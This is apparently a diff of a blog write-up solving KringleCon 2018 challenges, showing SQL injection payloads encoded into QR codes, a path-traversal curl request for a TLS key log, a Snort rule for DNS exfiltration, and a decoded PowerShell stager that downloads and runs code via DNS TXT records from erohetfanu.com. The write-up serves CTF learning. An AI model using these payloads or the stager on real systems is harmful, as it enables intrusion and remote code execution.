@@ -68,11 +68,11 @@ Which gives the answer "John McClane"
 
 We map the four symbols to the letters A-D and then use the `de_bruijn()` function included in pwntools to generate the n=4, k=4 de Bruijn sequence:
 
-```
-print(''.join(de_bruijn("ABCD", 4)))
+{% highlight python %}
+> print(''.join(de_bruijn("ABCD", 4)))
 #-----------------vvvv
 AAAABAAACAAADAABBAABCAABDAACBAACCAACDAADBAADCAADDABABACABADABBBABBCABBDABCBABCCABCDABDBABDCABDDACACADACBBACBCACBDACCBACCCACCDACDBACDCACDDADADBBADBCADBDADCBADCCADCDADDBADDCADDDBBBBCBBBDBBCCBBCDBBDCBBDDBCBCBDBCCCBCCDBCDCBCDDBDBDCCBDCDBDDCBDDDCCCCDCCDDCDCDDDD
-```
+{% endhighlight %}
 
 We can then start typing in these symbols.
 Eventually, we reach the sequence: "TRIANGLE SQUARE CIRCLE TRIANGLE" which is the correct password (marked in comment above)
@@ -85,19 +85,19 @@ We get a URL to a git repo which we can analyze: https://git.kringlecastle.com/U
 
 By checking out the repo, looking at the commit messages in the log and checking out an interesting looking state, we can find a zip file.
 
-```
-> git clone https://git.kringlecastle.com/Upatree/santas_castle_automation
-> git log
-> git checkout 4c32967a8e097180c328cd02ec81df5c4d36200e
-> find . -name '*.zip'
+{% highlight shell %}
+$ git clone https://git.kringlecastle.com/Upatree/santas_castle_automation
+$ git log
+$ git checkout 4c32967a8e097180c328cd02ec81df5c4d36200e
+$ find . -name '*.zip'
 ./schematics/ventilation_diagram.zip
-> cp schematics/ventilation_diagram.zip ..
-```
+$ cp schematics/ventilation_diagram.zip ..
+{% endhighlight %}
 
 We can then use "trufflehog" to search for interesting data:
 
-```
-> trufflehog --entropy true santas_castle_automation
+{% highlight shell %}
+$ trufflehog --entropy true santas_castle_automation
 ...
 Reason: High Entropy
 Date: 2018-12-11 08:16:57
@@ -108,7 +108,7 @@ Commit: important update
 
 -Password = 'Yippee-ki-yay'
 ...
-```
+{% endhighlight %}
 
 Which gives us the password: "Yippee-ki-yay"
 
@@ -122,29 +122,29 @@ Looking at the graph, I ignored all edges marked "CanRDP" and thus arrived at th
 
 We can analyze the given badge with zbarimg.
 
-```
-> zbarimg alabaster_badge.jpg
+{% highlight shell %}
+$ zbarimg alabaster_badge.jpg
 QR-Code:oRfjg5uGHmbduj2m
-```
+{% endhighlight %}
 
 The badge contains an ID and the hypothesis is that it is passed to an SQL query.
 We try encoding and submitting some QR codes with an SQL injection payload.
 The following attempts gives various types of errors:
 
-``` 
-qrencode -o badge_hack.png "' OR '1'='1"
-qrencode -o badge_hack.png "'/**/OR/**/'1'='1" 
-qrencode -o badge_hack.png "'/**/OR/**/'1'='0"
-```
+{% highlight shell %}
+$ qrencode -o badge_hack.png "' OR '1'='1"
+$ qrencode -o badge_hack.png "'/**/OR/**/'1'='1" 
+$ qrencode -o badge_hack.png "'/**/OR/**/'1'='0"
+{% endhighlight %}
 
 This tells us that the account found by the 1=1 is disabled so we need to insert a dummy account with a UNION statement.
 We try until we get the number of columns right.
 
-```
-qrencode -o badge_hack2.png "' UNION SELECT 1;#"
+{% highlight shell %}
+$ qrencode -o badge_hack2.png "' UNION SELECT 1;#"
 ...
-qrencode -o badge_hack2.png "' UNION SELECT 1,2,3;#"
-```
+$ qrencode -o badge_hack2.png "' UNION SELECT 1,2,3;#"
+{% endhighlight %}
 
 This unlocks the door and gives us the access control number: 19880715
 
@@ -171,11 +171,11 @@ Adding this together leads us to getting the (corrupted) source code at "https:/
 In the source code we see that we can list the contents of the environment variable list by accessing them as a path.
 Doing this gives us the path of the SSLKEYLOGFILE.
 
-```
-> curl 'https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/'
+{% highlight shell %}
+$ curl 'https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/'
 Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/'
-> curl 'https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log' -O
-```
+$ curl 'https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log' -O
+{% endhighlight %}
 
 We can then download this log and a packet capture we get from registering, logging in and pressing "sniff".
 Putting the SSLKEYLOGFILE and the packet capture into Wireshark allows us to decrypt the HTTPS traffic and retrieve the login for "alabaster".
@@ -204,21 +204,21 @@ Using tshark we can look at the traffic and see a lot of DNS queries on the foll
 Looking at a few more examples, we see that the query is always 56 characters long with first 1-3 digits followed by a separator and about 40 hex characters.
 We can then write the following Snort rule to match these queries
 
-```
-> cat /etc/snort/rules/local.rules 
+{% highlight shell %}
+$ cat /etc/snort/rules/local.rules 
 alert udp any any <> any 53 (msg:"DNS Malware"; sid:1000001; pcre:"/.*[0-9A-F]{1,4}.[A-F0-9]{35,42}/"; rev:2;) 
-```
+{% endhighlight %}
 
 ### Part 2 - Identify the Domain
 
 In the "docm" file we can extract the embedded VBA code which contains a compressed and base 64 converted snippet of code.
 Decoding it gives the inner payload.
 
-```
-> echo "lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG" | base64 -d > vba_payload.dat
-> printf "\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00" |cat - vba_payload.dat|gunzip --
+{% highlight shell %}
+$ echo "lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG" | base64 -d > vba_payload.dat
+$ printf "\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00" |cat - vba_payload.dat|gunzip --
 function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = "77616E6E61636F6F6B69652E6D696E2E707331"; $h = ""; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; iex($(H2A $h | Out-string))
-```
+{% endhighlight %}
 
 Which gives us the domain the malware is communicating with: "erohetfanu.com".
 
@@ -228,10 +228,10 @@ The inner payload is a stager which uses the remote domain for downloading anoth
 Using the same Powershell code we can download the uncompressed "wannacookie.ps1" file and read the source code.
 There is a suspicious string in the code and again by using the powershell code we can decode it.
 
-```
-> echo $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings)))
+{% highlight powershell %}
+$ echo $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings)))
 yippeekiyaa.aaay
-```
+{% endhighlight %}
 
 This gives us the killswitch domain that we can register (Support Marcus Hutchins): yippeekiyaa.aaay
 
@@ -242,14 +242,14 @@ By analyzing the source code, we see that the malware generates a secret key, do
 Usung powerdump we can search for Powershell variables in memory. By downloading the same public key "server.crt" and encrypting a dummy value we can see that the encrypted key is 512 characters.
 With this info we can search in powerdump for variables of roughly that length which gives is a few results. All of them are code blocks except one which has the following value:
 
-> 3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849
-> d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c
-> 34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4
-> d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e6
-> 9309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e3816
-> 91dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c0010
-> 0b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6e
-> dce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971
+> 3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849  
+> d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c  
+> 34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4  
+> d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e6  
+> 9309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e3816  
+> 91dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c0010  
+> 0b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6e  
+> dce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971  
 
 We can then download the private key "server.key" and first decrypt the key and then use the key to decrypt the password database with the following Python code:
 
